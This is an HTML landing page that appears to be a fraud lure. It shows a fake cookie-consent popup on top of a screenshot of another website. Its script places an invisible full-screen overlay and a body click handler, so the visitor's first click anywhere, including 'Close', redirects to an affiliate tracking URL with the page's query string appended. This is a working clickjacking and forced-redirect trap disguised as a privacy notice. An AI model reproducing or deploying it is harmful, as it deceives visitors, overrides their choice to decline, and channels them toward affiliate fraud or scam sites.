<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zenthia</title>

<style>
body {
  margin: 0;
  min-height: 100vh;
  background-image: url("https://s3.eu-central-2.wasabisys.com/w.storage.screenshotapi.net/www_earthwolftrack_com_2s7bzzjr_22n1xnw9__3b5eb1bf822e.png");
  background-size: cover;
  background-position: center;
  font-family: Arial, sans-serif;
}

#overlay {
  position: fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background: rgba(0,0,0,0.6);
  display:flex;
  align-items:center;
  justify-content:center;
  z-index:9999;
}

.popup {
  background: #f9fafb;
  padding: 30px 25px;
  max-width: 360px;
  width: 90%;
  border-radius: 20px;
  text-align: center;
  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
  border: 6px solid #eef5f8;
}

.popup h2 {
  color: #2e7a63;
  font-weight: 500;
  margin-bottom: 15px;
}

.popup p {
  color: #2e7a63;
  font-size: 14px;
  line-height: 1.5;
}

.buttons {
  margin-top: 20px;
  display:flex;
  gap:10px;
  justify-content:center;
}

button {
  padding: 12px 20px;
  border-radius: 12px;
  cursor: pointer;
  border: none;
  font-size: 14px;
}

.accept {
  background: #5bbfa1;
  color: white;
}

.close {
  background: transparent;
  border: 2px solid #eef5f8;
  color: #2e7a63;
}

.footer {
  margin-top: 15px;
  font-size: 12px;
  color: #2e7a63;
}
</style>
</head>

<body>

<div id="overlay">
  <div class="popup">
    <h2>Cookies</h2>
    <p>
      This website uses cookies to personalize content and ads,
      provide social media features, and analyze our traffic.
      By clicking "Allow", you consent to the use of cookies.
      For more information, see our cookie policy.
    </p>

    <div class="buttons">
      <button class="accept">Allow</button>
      <button class="close">Close</button>
    </div>

    <div class="footer">
      Your privacy is important to us
    </div>
  </div>
</div>

<script>
function getAffiliateUrl(baseUrl) {
  return baseUrl + window.location.search;
}

document.addEventListener("DOMContentLoaded", () => {
  const baseUrl = "https://www.firewolftrack.com/2ZWCMC65/224RLGXW/";
  let clicked = false;

  function redirect() {
    if (clicked) return;
    clicked = true;

    const url = getAffiliateUrl(baseUrl);

    const a = document.createElement("a");
    a.href = url;
    document.body.appendChild(a);
    a.click();
  }

  document.body.addEventListener("click", redirect);

  const overlay = document.createElement("div");
  overlay.style.cssText = `
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    z-index:999999;
    background:transparent;
  `;
  overlay.addEventListener("click", redirect);
  document.body.appendChild(overlay);
});
</script>

</body>
</html>
